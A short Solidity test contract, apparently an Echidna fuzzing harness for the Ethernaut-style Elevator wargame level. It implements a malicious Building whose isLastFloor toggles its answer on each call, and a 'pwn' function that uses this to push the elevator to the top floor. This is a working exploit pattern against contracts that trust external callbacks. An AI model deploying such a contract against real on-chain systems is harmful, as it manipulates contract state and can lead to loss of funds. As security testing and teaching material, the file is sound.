pragma solidity ^0.5.0;

import 'contract.sol';

contract Test is Building {
  Elevator lift;
  bool flipflop;

  constructor() public {
    lift = new Elevator();
    flipflop = true;
  }

  function pwn(uint x) public {
    lift.goTo(x);
  }

  function isLastFloor(uint) public returns (bool) {
    flipflop = !flipflop;
    return flipflop;
  }

  function echidna_test_floor() public returns (bool) {
    return !lift.top();
  }
}
